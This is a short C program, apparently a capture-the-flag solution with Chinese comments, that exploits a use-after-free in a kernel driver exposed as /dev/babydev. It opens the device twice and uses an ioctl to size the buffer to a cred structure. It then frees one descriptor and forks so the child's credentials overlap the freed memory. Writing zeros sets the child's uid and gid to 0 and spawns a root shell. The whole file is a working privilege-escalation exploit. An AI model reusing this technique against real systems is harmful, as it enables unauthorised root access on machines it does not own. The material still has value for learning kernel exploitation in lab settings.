#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>

int main()
{
	// 打开两次设备
	int fd1 = open("/dev/babydev", 2);
	int fd2 = open("/dev/babydev", 2);

	// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)
	ioctl(fd1, 0x10001, 0xa8);

	// 释放 fd1
	close(fd1);

	// 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠
	int pid = fork();
	if(pid < 0)
	{
		puts("[*] fork error!");
		exit(0);
	}

	else if(pid == 0)
	{
		// 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0
		char zeros[30] = {0};
		write(fd2, zeros, 28);

		if(getuid() == 0)
		{
			puts("[+] root now.");
			system("/bin/sh");
			exit(0);
		}
	}
	
	else
	{
		wait(NULL);
	}
	close(fd2);

	return 0;
}
